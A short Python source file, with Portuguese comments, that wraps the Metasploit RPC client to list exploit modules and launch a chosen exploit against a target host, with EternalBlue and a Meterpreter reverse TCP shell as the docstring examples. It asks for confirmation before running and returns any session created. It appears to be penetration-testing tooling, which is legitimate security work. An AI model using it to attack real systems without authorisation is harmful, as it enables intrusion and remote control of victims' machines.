from pymetasploit3.msfrpc import MsfRpcClient
import logging


class MetasploitClient:
    def __init__(self, password, port=55553):
        self.client = MsfRpcClient(password, port=port)
        logging.basicConfig(level=logging.INFO)

    def list_exploits(self):
        """Lista e imprime todos os exploits disponíveis."""
        exploits = self.client.modules.exploits
        print("Exploits disponíveis:")
        for exploit in exploits:
            print(f"- {exploit}")
        return exploits

    def run_exploit(self, exploit_name, target, payload, confirm=True):
        """
        Executa um exploit.

        :param exploit_name: Nome do exploit (ex: 'windows/smb/ms17_010_eternalblue').
        :param target: Endereço IP ou host do alvo.
        :param payload: Payload a ser utilizado (ex: 'windows/x64/meterpreter/reverse_tcp').
        :param confirm: Se True, pede confirmação antes de executar o exploit.
        """
        # Verifica se o exploit e o payload existem
        if exploit_name not in self.client.modules.exploits:
            raise ValueError(f"Exploit '{exploit_name}' não encontrado.")
        if payload not in self.client.modules.payloads:
            raise ValueError(f"Payload '{payload}' não encontrado.")

        exploit = self.client.modules.use('exploit', exploit_name)
        exploit['RHOSTS'] = target

        # Pede confirmação antes de executar
        if confirm:
            print(f"Você está prestes a executar o exploit {exploit_name} no alvo {target} com o payload {payload}.")
            resposta = input("Tem certeza que deseja continuar? (s/n): ").strip().lower()
            if resposta != 's':
                print("Exploit cancelado.")
                return

        # Executa o exploit
        logging.info(f"Executando exploit {exploit_name} no alvo {target}...")
        result = exploit.execute(payload=payload)
        if result and 'session_id' in result:
            logging.info(f"Sessão criada: {result['session_id']}")
            return result['session_id']
        logging.info("Exploit executado.")